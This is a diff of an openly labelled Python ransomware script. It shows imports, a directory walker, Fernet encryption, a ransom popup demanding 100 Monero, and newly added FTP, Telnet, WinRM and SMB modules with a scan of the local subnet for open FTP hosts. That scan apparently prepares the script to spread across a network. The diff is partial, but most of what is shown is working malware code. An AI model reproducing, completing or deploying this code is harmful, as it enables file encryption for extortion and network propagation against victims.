@@ -1,4 +1,5 @@
 # Author: SergioZ3R0
+#region Imports
 import subprocess
 import sys
 import os
@@ -6,14 +7,19 @@ import ctypes
 import socket
 from datetime import datetime, timedelta
 import time
-from window import window
+import window
+
 #Install cryptography module
 def install(package): # Install the required package
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
 install('cryptography') # Install the cryptography package
 from cryptography.fernet import Fernet
-
+from ftplib import FTP
+import telnetlib
+import winrm
+from smb.SMBConnection import SMBConnection
+#endregion
 files = [] # List to store the files in the current directory.
 def recorrer_arbol_directorios(directory):
     global files
@@ -85,14 +91,18 @@ try:
 except:
     print("Error sending file Unreachable host")
 
+
 #Delete the randsomware
 #os.remove("key.key")
 #os.remove("encryption_time.txt")
 #os.remove("unified_file.txt")
-window()
+window.Window()
 if sys.platform == "linux":
     subprocess.Popen(['zenity', '--info', '--text=' + "All files have been encrypted!"])
 else:
     ctypes.windll.user32.MessageBoxW(0, "All file have been encrypted Send me 100 Monero(XMR) to my wallet(WALLET)", "Notification", 1)
 print("All files encrypted! Send me 100 Monero(XMR) to my wallet(WALLET)")
+
+network_prefix="192.168.1"
+open_ftp_hosts = scan_network_for_open_ftp(network_prefix)
 #os.remove("darthvader.py")
